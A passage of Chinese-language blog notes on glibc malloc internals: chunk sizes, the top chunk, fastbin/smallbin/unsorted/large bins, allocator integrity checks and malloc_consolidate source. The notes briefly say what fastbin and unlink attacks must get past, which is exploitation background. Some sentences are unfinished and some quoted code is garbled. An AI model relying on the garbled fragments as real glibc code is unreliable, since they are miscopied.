rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97158973</a></p></li><li><p><strong>总结：</strong>chunk的实际大小=malloc的大小+chunk的前两个成员+mchunk_prev_size成员的合并操作+chunk对齐规则</p><h3 id="pre-inuse的合并操作"><a href="#pre-inuse的合并操作" class="headerlink" title="pre_inuse的合并操作"></a>pre_inuse的合并操作</h3>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//为了达到演示效果，防止合并后的chunk与top chunk合并</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">    <span class="built_in">free</span>(p2);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <img src="/images/Heap/image-20200905165701717.png" alt="image-20200905165701717"></p></li></ul><p>打断点下到sleep ，查看heap 图，在glibc2.6后分配malloc_chunk时除了最后的top chunk外，在开头还多了一块</p><p>在tcache机制下，实验并不成功。 tcache组阻止两个chunk合并</p><h3 id="chunk的最低大小"><a href="#chunk的最低大小" class="headerlink" title="chunk的最低大小"></a>chunk的最低大小</h3><p>最小的chunk需要保证能放下prev_seiz, siez, fd以及bk字段并保证对齐。在32位系统中，即16字节，在64位系统中，一般位32字节。在64位系统中也可能定义INTERNAL_SIZE_T也即size_t为</p><p>在32位系统中，</p><ul><li><p>前面介绍过，malloc的堆块大小在glibc中会加上前两个成员的大小（0x10大小），所以当你分配一个堆内存时，堆内存的最小大小一定为0x20（0x10+0x10）。（即使malloc没有指定大小，也要分配fd和bk成员，所以加起来就是malloc_chunk结构体的前4个成员的大小总和）</p></li><li><p><strong>总结：</strong>chunk的最低大小一定为0x20大小 (64位)  // 第一次malloc(待定)</p><p>第一次malloc时会</p><p>在64位系统中也可同</p></li><li><p>mchunk_size成员显示的是当前chunk的大小加上[NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE]的值</p></li><li><p>这个成员显示的大小并不等价于该chunk在内存中的大小，但是我们可以通过该成员推断出chunk的大小以及[NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE]位的值</p></li></ul><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The top-most available chunk (i.e., the one bordering the end of</span></span><br><span class="line"><span class="comment">    available memory) is treated specially. It is never included in</span></span><br><span class="line"><span class="comment">    any bin, is used only if no other chunk is available, and is</span></span><br><span class="line"><span class="comment">    released back to the system if it is very large (see</span></span><br><span class="line"><span class="comment">    M_TRIM_THRESHOLD).  Because top initially</span></span><br><span class="line"><span class="comment">    points to its own bin with initial zero size, thus forcing</span></span><br><span class="line"><span class="comment">    extension on the first malloc request, we avoid having any special</span></span><br><span class="line"><span class="comment">    code in malloc to check whether it even exists yet. But we still</span></span><br><span class="line"><span class="comment">    need to do so when getting memory from system, so we make</span></span><br><span class="line"><span class="comment">    initial_top treat the bin as a legal but unusable chunk during the</span></span><br><span class="line"><span class="comment">    interval between initialization and the first call to</span></span><br><span class="line"><span class="comment">    sysmalloc. (This is somewhat delicate, since it relies on</span></span><br><span class="line"><span class="comment">    the 2 preceding words to be zero during this interval as well.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> initial_top(M) (unsorted_chunks(M))</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序第一次进行 <span class="built_in">malloc</span> 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。</span><br></pre></td></tr></table></figure><p>需要注意的是，top chunk 的 prev_inuse 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p><p><strong>初始情况下，我们可以将unsorted chunk作为 top chunk</strong></p><h3 id="malloc-一个chunk-的检查机制"><a href="#malloc-一个chunk-的检查机制" class="headerlink" title="malloc 一个chunk 的检查机制"></a>malloc 一个chunk 的检查机制</h3><p>当malloc时，如果fastbins，smallbins种有满足需求的chunk可以使用时，malloc就会在相关的bins链中寻找可用的freechunk来使用 ，<strong>但是取走一个freekchunk是有检测机制的</strong></p><h4 id="fastbin的检测机制"><a href="#fastbin的检测机制" class="headerlink" title="fastbin的检测机制"></a>fastbin的检测机制</h4><h3 id="机制规则如下："><a href="#机制规则如下：" class="headerlink" title="机制规则如下："></a><strong>机制规则如下：</strong></h3><ul><li><strong>检测1：</strong>检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50，那么就会程序就报错退出）</li><li><strong>检测2：</strong>检测你这个freechunk的size成员的PREV_INUSE为是否为1，为1才可以通过检测</li></ul><p><img src="/images/Heap/20190730105842374.png" alt="img"></p><blockquote><h5 id="check-remalloced-chunk函数："><a href="#check-remalloced-chunk函数：" class="headerlink" title="check_remalloced_chunk函数："></a><strong>check_remalloced_chunk函数：</strong></h5><ul><li><strong>函数功能：</strong>该函数主要用来检测chunk的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位。该函数中的if会判断chunk是否为mmap申请，还有是否为main_arena管理等</li><li><strong>在fastbin中：</strong>主要用来会检测你要malloc的这个chunk的PREV_INUSE为是否为1</li><li>如果是正常chunk就可以过这个检测，但是是fastbin attack，那么需要设计来跳过这个检测</li></ul><p><img src="/images/Heap/20190812193650809.png" alt="img"></p></blockquote><h4 id="small-bin的检测机制"><a href="#small-bin的检测机制" class="headerlink" title="small bin的检测机制"></a>small bin的检测机制</h4><ul><li>判断下一个chunk的fd指针释放为自己，victim此时为要malloc出去的chunk，bck是后一个chunk</li><li>如果使用了unlink攻击，那么bk就被改了，从而bck就改了，那么bck的fd也就变了，此时就出错了</li></ul><p><img src="/images/Heap/20190810092142921.png" alt="img"></p><h3 id="bin链（struct-malloc-state"><a href="#bin链（struct-malloc-state" class="headerlink" title="bin链（struct malloc_state)"></a>bin链（struct malloc_state)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];c</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><ul><li><strong>fastbinY数组：</strong>大小为10。记录的是fast bin链</li><li><strong>bins数组：</strong>大小为129。记录的是unsorted bin（1）、small bin（2<del>63）、large bin链（64</del>126）</li></ul><h3 id="关于几个bin链成员"><a href="#关于几个bin链成员" class="headerlink" title="关于几个bin链成员"></a>关于几个bin链成员</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/96865321" target="_blank" rel="noopener">参考1</a></p><ul><li><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4></li></ul><p>0x30<del>0x40  （0x20</del>0x80)   单链表（LIFO)</p><p>相邻空间不会被合并，不清理pre_inue (p位：判断前一个chunk是否被使用)</p><p>默认情况下（<strong>32 位系统为例</strong>）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 prev_size 和 size 字段部分的大小</p><p><strong>fastbin 的索引</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="comment">// chunk size=2*size_sz*(2+idx)</span></span><br><span class="line"><span class="comment">// 这里要减2，否则的话，前两个bin没有办法索引到。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong>需要特别注意的是，fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的 chunk 合并。</strong></p><p>free中的fastbin相关的处理源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(<span class="built_in">size</span>) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    ## 对<span class="built_in">size</span>进行基本的检查</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, <span class="built_in">size</span>)-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, <span class="built_in">size</span>))</span><br><span class="line">                 &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    ...</span><br><span class="line">    ## 对next chunk的<span class="built_in">size</span>进行检查</span><br><span class="line">    <span class="keyword">if</span> (chunk_at_offset (p, <span class="built_in">size</span>)-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">            || chunksize (chunk_at_offset (p, <span class="built_in">size</span>)) &gt;= av-&gt;system_mem;</span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    ## 获取对应的fastbin index</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(<span class="built_in">size</span>);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">       (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">    p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>对于fastbin的free过程主要包括如下：</p><ol><li><p>对释放的堆块的size进行基本的检查。</p></li><li><p>对释放堆块的下一个堆块的size进行基本的检查。</p></li><li><p>获取释放堆块所对应的fastbin链表对应的索引。</p></li><li><p>检查是否是double free。</p></li><li><p>释放进单链表。</p></li></ol><h5 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate()"></a>malloc_consolidate()</h5><p>是free()的一个小的变体，专门用来处理fastbin中的空先chunk，它同时还负责堆管理的初始化工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Also, because this routine needs to be called the first time through</span></span><br><span class="line"><span class="comment">  malloc anyway, it turns out to be the perfect place to trigger</span></span><br><span class="line"><span class="comment">  initialization code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T <span class="built_in">size</span>;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn't</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren't immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      check_inuse_chunk(av, p);</span><br><span class="line">      nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">      <span class="built_in">size</span> = p-&gt;<span class="built_in">size</span> &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">      nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);</span><br><span class="line">      nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = p-&gt;prev_size;</span><br><span class="line">        <span class="built_in">size</span> += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">        unlink(av, p, bck, fwd);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">          <span class="built_in">size</span> += nextsize;</span><br><span class="line">          unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">        unsorted_bin-&gt;fd = p;</span><br><span class="line">        first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (<span class="built_in">size</span>)) &#123;</span><br><span class="line">          p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">        p-&gt;bk = unsorted_bin;</span><br><span class="line">        p-&gt;fd = first_unsorted;</span><br><span class="line">        set_foot(p, <span class="built_in">size</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">size</span> += nextsize;</span><br><span class="line">        set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/Plus_RE/article/details/79265805" target="_blank" rel="noopener">参考</a></p><h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h4><p>个数为62个</p><p>  在32位系统中，small bins里的chunk大小从16到504字节；在64位系统中，small bins里的chunk大小从32到1016字节。</p><p>将申请的内存大小加上每个chunk的overhead，也就是chunk结构体里的size字段。然后对齐，就是需要分配的chunk的大小。</p><p>chunk&lt;1024bytes(64bit)[0x400]  chun_size=2<em>SIZE_SZ</em>index</p><p>双向链表</p><p>在64位系统中，malloc(88)= 0x88+8=0x90</p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table><p>这里我们以 32 位平台的 large bin 为例，第一个 large bin 的起始 chunk 大小为 512 字节，位于第一组，所以该 bin 可以存储的 chunk 的大小范围为 [512,512+64)。</p><p>关于 large bin 的宏如下，这里我们以 32 位平台下，第一个 large bin 的起始 chunk 大小为例，为 512 字节，那么 512&gt;&gt;6 = 8，所以其下标为 56+8=64。</p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the "unsorted" bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>unsorted bin 处于我们之前所说的 bin 数组下标 1 处。故而 unsorted bin 只有一个链表。unsorted bin 中的空闲 chunk 处于乱序状态，主要有两个来源</p><ul><li><p>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</p></li><li><p>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</p><p>  Unsorted Bin 在使用的过程中，采用的遍历顺序时FIFO(链表的操作先进先出（即后来的节点在尾部）)，即一个chunk放入unsorted bin 链时将该堆块插入链表头，从而者个链取堆块的时候是从尾部开始的，因此unsorted bin遍历堆块的时候使用的是bk指针。</p><p>  分析源码</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">从下面源码可以看出首先取链表尾部的chunk记作victim，倒数第二个chunk记作bck，首先要对victim的<span class="built_in">size</span>位进行检查，这个约束比较宽松，计算得到chunk实际大小。一个代码块是假如我们申请的chunk属于small bin的范围，且last remainder是unsorted bin的唯一一个chunk时，我们优先使用这个块，如果该块满足条件则对其进行切割和解链操作。</span><br><span class="line"></span><br><span class="line">如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。其中unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);是unsorted bin 